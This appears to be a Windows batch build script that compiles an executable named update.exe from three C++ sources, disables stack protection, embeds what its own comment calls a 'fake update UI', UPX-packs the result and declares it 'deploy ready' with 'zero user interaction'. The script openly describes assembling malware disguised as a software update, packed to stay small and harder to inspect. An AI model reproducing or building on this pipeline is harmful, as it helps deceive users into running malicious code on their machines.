@echo off 
 REM Silent compilation - no console output 
 cl /nologo /O2 /MT /GS- /DNDEBUG /Fe:assets\update.exe main.cpp engine.cpp network.cpp /link ntdll.lib user32.lib 
 
 REM Resource embedding (fake update UI) 
 rc fake-ui.rc 
 link /nologo update.exe fake-ui.res /out:update.exe 
 
 REM UPX packing (optional) 
 upx --best --ultra-brute update.exe 
 
 echo Build complete: update.exe (47KB) 
 echo Deploy ready - zero user interaction 
 pause